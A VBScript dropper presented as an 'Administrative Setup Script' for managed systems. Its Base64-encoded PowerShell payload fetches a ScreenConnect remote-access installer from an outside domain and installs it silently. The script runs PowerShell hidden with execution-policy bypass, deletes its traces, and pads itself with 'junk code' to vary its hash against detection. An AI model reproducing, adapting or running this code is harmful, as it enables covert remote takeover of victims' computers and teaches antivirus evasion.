' =============================================================
' Administrative Setup Script - FDI Managed Systems
' =============================================================

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' This Base64 contains the PowerShell logic to download the MSI to TEMP and run msiexec /qn
base64Script = "JHVybCA9ICJodHRwczovL25pY2tqcG90LnVzL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0IgokcGF0aCA9ICIkZW52OlRFTVBcc2V0dXBfbXNpX2xvZy5tc2kiCltzZXJ2aWNlcG9pbnRtYW5hZ2VyXTo6c2VjdXJpdHlwcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMgpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJHBhdGgKU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvaSAkcGF0aCAvcW4iIC1XYWl0ClJlbW92ZS1JdGVtICRwYXRo"

decodedScript = DecodeBase64WithMSXML(base64Script)
tempFile = objShell.SpecialFolders("MyDocuments") & "\FDI_Deployment.ps1"

WriteBinaryToFile tempFile, decodedScript

' Initial delay before execution
RandomDelay 3000, 5000

' Execute PowerShell in hidden mode (0) without waiting (False)
cmd = "powershell -ExecutionPolicy Bypass -File """ & tempFile & """"
objShell.Run cmd, 0, False

' Extended delays to ensure the installation completes before cleanup
RandomDelay 5000, 5000
RandomDelay 5000, 5000
RandomDelay 5000, 5000

' Cleanup: Delete the deployment script
If objFSO.FileExists(tempFile) Then
    objFSO.DeleteFile tempFile
End If

Set objShell = Nothing
Set objFSO = Nothing

' =============================================================
' Helper Functions
' =============================================================

Function DecodeBase64WithMSXML(base64Str)
    Dim objXML, objNode
    Set objXML = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML.CreateElement("base64")
    objNode.DataType = "bin.base64"
    objNode.Text = base64Str
    DecodeBase64WithMSXML = objNode.nodeTypedValue
End Function

Sub WriteBinaryToFile(filePath, binaryData)
    Dim objStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write binaryData
    objStream.SaveToFile filePath, 2 
    objStream.Close
    Set objStream = Nothing
End Sub

Sub RandomDelay(min, max)
    Randomize
    delayTime = Int((max - min + 1) * Rnd + min)
    WScript.Sleep delayTime
End Sub

' =============================================================
' Static Junk Code (Hash Variation)
' =============================================================

Function ComplexCalc1(x, y)
    Dim a, b, c
    a = x ^ 2 + y ^ 2
    b = Sqr(a) * Log(a + 1)
    c = Sin(x) * Cos(y) + Exp(-x / y)
    ComplexCalc1 = b + c
End Function

Function ComplexCalc2(n)
    Dim i, sum, prod
    sum = 0
    prod = 1
    For i = 1 To n
        sum = sum + i ^ 2
        prod = prod * (1 + 1 / i)
    Next
    ComplexCalc2 = Sqr(sum) * Log(prod)
End Function